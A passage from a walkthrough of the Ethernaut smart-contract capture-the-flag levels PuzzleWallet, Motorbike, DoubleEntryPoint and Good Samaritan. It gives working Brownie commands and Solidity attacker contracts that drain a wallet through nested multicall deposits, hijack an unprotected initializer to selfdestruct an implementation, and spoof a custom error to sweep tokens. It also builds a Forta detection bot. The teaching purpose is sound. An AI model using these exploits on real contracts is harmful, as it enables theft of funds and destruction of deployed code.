This level showcases some of the dangers associated with using proxy implementations - if you're familiar with delegatecall, you shouldn't have much trouble figuring this one out.

Take a look at both contracts. Notice that `pendingAdmin` and `owner` are each in slot 0 of storage for their respective contract, and `admin` and `maxBalance` are each in slot 1.

Right away we can see that `proposeNewAdmin` lets us set ourselves as the pendingAdmin of PuzzleProxy. 

First I'll load interfaces of both PuzzleProxy and PuzzleWallet for my instance's address:

    proxy = interface.IPuzzleProxy(instance)
    wallet = interface.IPuzzleWallet(instance)

    proxy.proposeNewAdmin(player.address, {'from': player})

    #check that we're now the pendingAdmin - should return our address
    proxy.pendingAdmin()

    #now check the PuzzleWallet's owner - should also be our address
    wallet.owner()

We want to do the same thing in reverse to set ourselves as the admin of the proxy, but we can't call `setMaxBalance` without becoming whitelisted and emptying the contract's ether balance. Now that we're the owner, we can go ahead and add ourselves to the whitelist:

    wallet.addToWhitelist(player.address, {'from': player})

Now we need to empty the the address using `execute`, but we can only send out as much ether as we've deposited - and there's a pre-existing balance in the contract. We need to get the contract to think we've deposited ether without actually depositing that much.

Notice that `deposit` will add whatever the `msg.value` of your call is to your entry in the `balances` mapping. If only there were a way to have this get called more than once in a single transaction which will have a constant `msg.value` across all calls contained within.

It turns out that `multicall` allows you to do exactly that. There's a catch, though:

    if (selector == this.deposit.selector) {
        require(!depositCalled, "Deposit can only be called once");
        // Protect against reusing msg.value
        depositCalled = true;
    }

It seems they've already thought of this attack vector! 

We can still get around it, though. You can only call `deposit` once per `multicall` - but what if you also included a deposit within a multicall and packaged that with another deposit in a multicall? Nested multicalls? Let's see:

    #first get the contract's balance since we need to deposit exactly the same amount
    amount = wallet.balance()

    depositPayload = wallet.deposit.encode_input()
    
    multicallPayload = wallet.multicall.encode_input([depositPayload])

    #now call deposit twice using multicall with the appropriate msg.value:
    wallet.multicall([depositPayload, multicallPayload],{'from': player, 'value': amount})

    #check your work - should return True
    wallet.balance() == wallet.balances(player.address)

    #now drain the contract (b'' is empty calldata)
    wallet.execute(player.address, wallet.balance(), b'', {'from': player})

    #check that wallet.balance() is now zero
    wallet.balance()

Now we can call `setMaxBalance`. Since we want to overwrite `admin` with our own address, we need to convert our address to a uint160:

    wallet.setMaxBalance(web3.toInt(hexstr=player.address), {'from': player})

    #check your work - should return your address
    proxy.admin()

Assuming everything has been done correctly, you should be able to submit the level at this point.

## 26. Motorbike

This is a pretty easy level. The main takeaway is to make sure you know what you're doing if you're going to use an initializer in your implementation contract. Set it up with a constructor that makes sure nobody can call initialize!

Since the deployer of this contract did not do that, we're going to call initialize and make ourselves the upgrader.

First get the engine's address which is stored at the `_IMPLEMENTATION_SLOT`:


    slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
    engineAddress = '0x' + web3.eth.getStorageAt(instance, slot).hex()[26:]
    engine = interface.engine(engineAddress)

    #call initialize()
    engine.initialize({'from': player})

    #check that you're the upgrader - should return your address
    engine.upgrader()

Now we can use `upgradeToAndCall` to change the implementation to our own malicious contract and call its `selfdestruct`.

Our contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface engine {
        function initialize() external;
        function upgrader() external view returns (address);
        function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    }

    contract MotorbikeAttacker {
        function attack() external {
            selfdestruct(payable(tx.origin));
        }
    }

Deploy it and upgrade with an encoded call to `attack`:

    attacker = MotorbikeAttacker.deploy({'from': player})
    payload = attacker.attack.encode_input()
    engine.upgradeToAndCall(attacker.address, payload, {'from': player})

    #check for success - should fail
    engine.upgrader()

Submit the level and move on!

## 27. DoubleEntryPoint

This level isn't that generally applicable as it seems to be more an ad for Forta than a challenge. I'm not particularly familiar with Forta, but you can do more research if you choose to. 

The idea is to set up a DetectionBot contract that will monitor the CryptoVault for activity - specifically any calls of its `sweepToken` function. 

We need our bot to implement a `handleTransaction` function so that it can be called by the `Forta` contract's `notify` function. Forta will call this each time a `delegateTransfer` call is made. The only time we actually need to raise an alert is if the caller of `delegateTransfer` is the CryptoVault contract, which means that it's being called within the `sweepToken` function. In this case, its third parameter `origSender` will be the CryptoVault's address.

Our contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IDetectionBot {
        function handleTransaction(address user, bytes calldata msgData) external;
    }

    interface IForta {
        function setDetectionBot(address detectionBotAddress) external; 
        function notify(address user, bytes calldata msgData) external;
        function raiseAlert(address user) external;
    }

    interface IDoubleEntryPoint {
        function forta() external view returns (address);
        function cryptoVault() external view returns (address);
    }

    contract DetectionBot is IDetectionBot {

        address public immutable instance;
        address public immutable cryptoVault;
        IForta public immutable forta;
        constructor(address _instance) {
            instance = _instance;
            cryptoVault = IDoubleEntryPoint(instance).cryptoVault();
            forta = IForta(IDoubleEntryPoint(instance).forta());
        }

        function handleTransaction(address user, bytes calldata msgData) external {
            (/*address to*/, /*uint256 value*/, address origSender) = abi.decode(msgData[4:], (address, uint256, address));
            if (origSender == cryptoVault) {
                forta.raiseAlert(user);
            }
        }
    }

Our `handleTransaction` function is simply decoding the incoming call's `msg.data` for the parameters of `delegateTransfer`. If the `origSender` is the CryptoVault, we know that `sweepToken` was called, and we raise an alert.

In the brownie console:

    detectionBot = DetectionBot.deploy(instance, {'from': player})
    forta = interface.IForta(detectionBot.forta())
    forta.setDetectionBot(detectionBot.address,{'from': player})

Submit the instance and move on to the final level.

## 28. Good Samaritan
    
This is an easy level. We've already seen everything here except for custom errors, which are very simple.

In the `requestDonation` function, it tries to call `wallet.donate10`. If that returns an error matching "NotEnoughBalance()", it will transfer all of the remaining coins to the caller.

In the wallet contract, the `donate10` function contains a call to `coin.transfer`. In the coin contract, we can see that the `transfer` function will attempt to call `notify` on the destination address if it's a contract. Now we know that we want to set up a malicious contract with a `notify` function.

The contract:

    //SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    interface IGoodSamaritan {
        function requestDonation() external returns (bool enoughBalance);
    }

    error NotEnoughBalance();

    contract GoodSamaritanAttacker {
        function notify(uint256 amount) external pure {
            if (amount <= 10) {
                revert NotEnoughBalance();
            }
        }

        function request(address target) external {
            IGoodSamaritan(target).requestDonation();
        }
    }

The contract will call `requestDonation`, which will attempt to call `donate10`. When `donate10` calls `transfer`, it will attempt to call our `notify` function which will revert the entire `donate10` attempt with the custom `NotEnoughBalance()` error. The catch statement will then transfer the remaining balance to our contract.

Notice that our `notify` function has a check for `amount <= 10`. This is because we DO NOT want it to revert when `transferRemainder` is called with the contract's full balance, which will be greater than 10.

Deploy the attacker contract and call its `request` method for your instance. Then you can submit the level.

#
### Congratulations, you've finished all 28 Ethernaut challenges!







